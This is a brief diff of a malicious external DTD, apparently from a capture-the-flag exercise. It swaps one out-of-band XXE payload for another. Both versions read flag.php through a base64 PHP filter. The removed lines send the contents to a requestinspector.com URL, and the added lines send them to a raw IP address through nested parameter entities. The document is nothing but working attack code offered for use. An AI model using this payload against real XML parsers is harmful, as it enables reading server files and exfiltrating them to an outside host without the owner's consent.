@@ -1,2 +1,4 @@
-<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://requestinspector.com/inspect/ljx/%payload;'>">
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://39.96.57.253/get.php?file=%payload;'>">
+%int;
+%trick;
